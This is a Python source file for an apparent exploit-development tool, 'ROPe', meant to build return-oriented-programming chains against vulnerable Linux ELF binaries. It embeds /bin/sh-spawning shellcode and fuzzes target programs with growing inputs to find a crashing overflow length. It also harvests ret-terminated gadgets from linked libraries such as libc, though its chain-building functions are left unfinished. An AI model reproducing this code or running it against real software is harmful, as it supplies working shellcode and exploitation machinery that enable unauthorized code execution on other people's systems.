#!/usr/bin/env python3

import os
import argparse
import struct
import subprocess
import re
from capstone import *
from pwn import *

arch = CS_ARCH_X86      # x86 processors
mode = CS_MODE_64       # 64-bit by default

verbose = False         # Enable verbose output?
files = None            # List of files to examine

# 2 possible shellcodes are provided, one for x86-64 and one for x86-32
# both are for `exec("/bin/sh")` calls
EXEC_BINSH64_SC =  b""
EXEC_BINSH64_SC += b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
EXEC_BINSH64_SC += b"\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
EXEC_BINSH64_SC += b"\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
EXEC_BINSH64_SC += b"\x00\x56\x57\x48\x89\xe6\x0f\x05"

#EXEC_BINSH32_SC =  b""                                                                                          
#EXEC_BINSH32_SC += b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f"                                      
#EXEC_BINSH32_SC += b"\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08"                                      
#EXEC_BINSH32_SC += b"\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53"                                      
#EXEC_BINSH32_SC += b"\x89\xe1\xcd\x80"                    


# Shellcode to be executed
shellcode = EXEC_BINSH64_SC

PLACEHOLDER = 0xdeadc0de
gadget_map = {}

# pretty colors
class Colors:
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    YELLOW = "\033[0;33m"
    CYAN = "\033[0;36m"
    GREY = "\033[0;37m"
    WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    RESET = "\033[0m"


# Prints out `s` if verbosity/debugging is enabled 
def debug(s, **kwargs):
    if verbose is True:
        if kwargs:
            print(f"{Colors.RED}{Colors.BOLD}DEBUG{Colors.WHITE}: {Colors.RESET}{s} {kwargs}{Colors.GREY}")
        else:
            print(f"{Colors.RED}{Colors.BOLD}DEBUG{Colors.WHITE}: {Colors.RESET}{s}{Colors.GREY}")


# Determines the length of the buffer necessary to cause SEGV
def find_buffer_length(f):
    buf = "A"
    found = False

    while found is False:
        # cap our buffer size at 5k
        if len(buf) > 5000:
            break

        proc = subprocess.Popen([f, buf], stdout=PIPE, stderr=PIPE)
        try:
            stdout, stderr = proc.communicate(timeout=5)
        except TimeoutExpired:
            proc.kill()
            stdout, stderr = proc.communicate()

        if proc.returncode == -11:
            debug(f"found overflow length: {len(buf)}")
            found = True
            break
        buf += "A"

    if found is False:
        return 0
    return len(buf)

# Small helper function to print a gadget in human-readable format
def print_gadget(g, g_addr):
    if verbose == 0:
        return

    md = Cs(CS_ARCH_X86, CS_MODE_64)
    md.detail = False

    instr_list = md.disasm(g, g_addr)
    s = f"{Colors.BOLD}{Colors.WHITE}" + format(g_addr, '#010x') + f"{Colors.GREY}: "
    for i in instr_list:
        s += i.mnemonic
        if i.op_str != "":
            s += f" {i.op_str}"
        s += f"{Colors.YELLOW};{Colors.GREY} "
    s += f"{Colors.RESET}{Colors.GREY}"
    print(s)


# Looks for usable gadgets in elfname, which is loaded into our target binary at baseaddr
def build_gadgets(elfname, baseaddr):
    global gadget_map
    gadgets = {}

    # we're only concerned with executable segments
    elf = ELF(elfname)
    for seg in elf.executable_segments:
        debug(f"Executable segment @ {hex(baseaddr + seg.header.p_paddr)} (offset {hex(seg.header.p_paddr)})")

        # read the segment
        data = elf.read(seg.header.p_paddr, seg.header.p_filesz)
        
        # does section contain ret instrs?
        ret_count = data.count(b"\xc3")
        if ret_count == 0:
            continue

        # split around ret instrs, clamp them to be <= 20 bytes long, and incrementally add unique ones into the gadgets list
        s_data = data.split(b"\xc3")
        s_offset = 0x0
        for s in s_data:
            # splitting around c3 bytes actually removes them, so we need to add them back in
            s += b"\xc3"

            s_len = len(s)
            i = 0
            if s_len > 20:
                s_len = 20

            while i < s_len:
                gadgets[baseaddr + s_offset + i] = s[i:s_len]
                i += 1

            s_offset += len(s)
            
        # check if the gadgets found are unique, and add them to the global map if so
        for g_addr in gadgets:
            if gadgets[g_addr] not in gadget_map.values():
                md = Cs(CS_ARCH_X86, CS_MODE_64)
                md.detail = False
                g = gadgets[g_addr]
                instr_list = md.disasm(g, g_addr)

                if instr_list is None:
                    continue

                g_len = len(g)
                cur_len = 0
                keep_gadget = True
                has_ret = False
                has_syscall = False

                for i in instr_list:
                    cur_len += i.size
                    # we only want things that end in ret
                    if i.mnemonic == "ret" and i.op_str == "":
                        has_ret = True

                    # get rid of all leave/j/call type instructions
                    if i.mnemonic == "leave":
                        keep_gadget = False
                    if i.mnemonic[0] == 'j':
                        keep_gadget = False
                    if i.mnemonic == "call":
                        keep_gadget = False

                if keep_gadget and cur_len == g_len and has_ret:
                    gadget_map[g_addr] = g
                    print_gadget(g, g_addr)


# Attempts to build the libc-mprotect chain
def build_libc_mprotect(f):

    return False


# Attempts to build one of the chains for the specified file
def build_chain(filename):
    global gadget_map

    print(f"{Colors.BOLD}{Colors.WHITE}Attempting to build ROP chain for \'{Colors.YELLOW}{filename}{Colors.WHITE}\'{Colors.RESET}{Colors.GREY}")

    elf = ELF(filename)

    # get the addresses of the functions needed in libc
    if elf.libc is None:
        debug("ELF does not import libc. pointless.")
        return None
    libc = elf.libc
    libc_addr = PLACEHOLDER
    mprotect_libc_addr = libc.symbols['mprotect']
    mmap_libc_addr = libc.symbols['mmap']
    memcpy_libc_addr = libc.symbols['memcpy']
    debug(f"libc mprotect addr @ {hex(mprotect_libc_addr)}")
    debug(f"libc mmap addr @ {hex(mmap_libc_addr)}")
    debug(f"libc memcpy addr @ {hex(memcpy_libc_addr)}")

    # What libraries is this linked against?
    # Herein we look for libc so we can update the libc base address (req'd for the libc calls above)
    # and also build the gadget list for each library
    for libname in elf.libs:
        debug(f"ELF linked against {libname} : {hex(elf.libs[libname])}")

        # is it libc? update the libc base addr
        is_libc = re.search('/libc-*.*.so$', libname)
        if is_libc is not None:
            libc_addr = elf.libs[libname]
            debug(f"libc base address @ {hex(libc_addr)}")

        # Build the collection of gadgets
        build_gadgets(libname, elf.libs[libname])

    print(f"{Colors.BOLD}{Colors.YELLOW}{len(gadget_map)}{Colors.GREY} gadgets found.{Colors.RESET}")

    # Determine length of buffer which causes vulnerability
    buflen = find_buffer_length(filename)

    if buflen <= 0:
        print(f"{Colors.BOLD}{Colors.YELLOW}{filename}{Colors.WHITE} does not appear to be vulnerable.")
        return None
    print(f"Target buffer overflows at {Colors.BOLD}{Colors.GREEN}{buflen}{Colors.RESET}{Colors.GREY} bytes")


    
    # Try libc-mprotect chain
    print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}libc-mprotect{Colors.GREY} chain...")
    res = build_libc_mprotect(filename)
    
    if res is not False:
        print("chain made!")
        return

    # Try libc-mmap-memcpy chain
    print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}libc-mmap-memcpy{Colors.GREY} chain...")

    # Try syscall-mprotect chain
    print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}syscall-mprotect{Colors.GREY} chain...")
    
    # Try syscall-mmap-memcpy chain
    print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}syscall-mmap-memcpy{Colors.GREY} chain...")


# Main ROPe function
def ROPe():

    # parse arguments
    parser = argparse.ArgumentParser(description="Automatically generate a ROP chain suitable for executing a third party payload.")
    parser.add_argument('-v', action='store_true', help='enable verbose output')
    #parser.add_argument('payload', nargs='?', help='payload to execute')
    parser.add_argument('files', nargs='+', help='list of ELFs to examine (must be in $PATH, or absolute paths)')
    args = parser.parse_args()

    if args.v:
        global verbose
        verbose = True
        debug("verbose: True")

    if args.files:
        global files
        debug(f"Files: {args.files}")
        files = args.files

    context(os='linux', arch='amd64')

    print(f"{Colors.BOLD}{Colors.GREY}Supplied shellcode{Colors.WHITE}: {Colors.GREY}\"{Colors.YELLOW}{shellcode}{Colors.GREY}\" {Colors.WHITE}")
   
    # Go through each supplied file, trying to build a ROP chain using it's gadgets
    for f in files:
        try:
            build_chain(f)
        except FileNotFoundError:
            print(f"{Colors.BOLD}{Colors.YELLOW}{f}{Colors.GREY} not found.{Colors.RESET}")


if __name__ == "__main__":
    ROPe()
